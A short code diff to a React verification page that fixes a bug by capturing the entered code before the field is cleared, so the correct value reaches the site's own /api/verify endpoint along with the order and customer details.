@@ -60,6 +60,7 @@ export default function VerifyPage() {
 
   async function handleSubmit() {
     if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
+    const submittedCode = code;
     setSubmitCooldown(5);
     submitCooldownRef.current = setInterval(() => {
       setSubmitCooldown(prev => {
@@ -67,12 +68,12 @@ export default function VerifyPage() {
         return prev - 1;
       });
     }, 1000);
-    setCode("");
     await fetch("/api/verify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code, orderId, customerName, customerId: customer?.nationalId ?? "—" }),
+      body: JSON.stringify({ code: submittedCode, orderId, customerName, customerId: customer?.nationalId ?? "—" }),
     });
+    setCode("");
     try {
       const res = await fetch("/api/admin/orders");
       const orders = await res.json();
